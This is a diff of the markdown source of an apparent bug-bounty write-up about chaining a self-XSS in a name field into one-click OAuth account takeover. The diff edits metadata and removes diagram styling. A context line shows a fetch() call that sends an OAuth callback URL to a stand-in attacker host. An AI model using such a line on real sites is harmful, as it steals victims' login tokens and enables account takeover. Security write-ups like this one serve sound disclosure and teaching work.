@@ -1,15 +1,16 @@
 ---
 title: "From a Sanitized Name Field to One-Click Account Takeover"
 keywords: "self xss, stored xss, dom xss, login csrf, oauth, account takeover, bypass chain, bug bounty, web security, client-side rendering"
-date: 2026-05-25
+date: 2026-05-25 12:00:00 +0200
 lastmod: 2026-05-25
 categories: [Security, Bug-Bounty, Web-Security]
-tags: [stored-xss, dom-xss, login-csrf, oauth, account-takeover, cookie-bomb, web-security, bug-bounty]
+description: "A sanitized name field, a 20-character limit and a WAF stood in the way. A chain of bypasses turned it into one-click account takeover."
 toc: true
 math: false
 mermaid: true
 image:
-  path: /assets/img/self-xss-account-takeover/cover.png
+  path: /assets/img/self-xss-account-takeover/cover.jpg
+  alt: A burglar carrying a box marked XSS sneaks past three cameras labelled Sanitizer, 20 chars and WAF
 ---
 
 
@@ -368,28 +369,6 @@ fetch("https://attacker.poc/c?u=" + encodeURIComponent(oauthWindow.location.href
 The attacker only had to visit the stolen callback URL to finish the login as the victim.
 
 The full chain looked like this:
-
-<style>
-  .mermaid svg text,
-  .mermaid svg tspan,
-  .mermaid svg .nodeLabel,
-  .mermaid svg .edgeLabel {
-    font-family: Arial, sans-serif !important;
-  }
-  .mermaid svg .actor,
-  .mermaid svg .actor text,
-  .mermaid svg .actor tspan {
-    font-weight: 800 !important;
-  }
-  .mermaid svg .noteText,
-  .mermaid svg .noteText tspan,
-  .mermaid svg g.note text,
-  .mermaid svg g.note tspan {
-    font-size: 17px !important;
-    font-weight: 800 !important;
-    letter-spacing: .02em !important;
-  }
-</style>
 
 ```mermaid
 sequenceDiagram
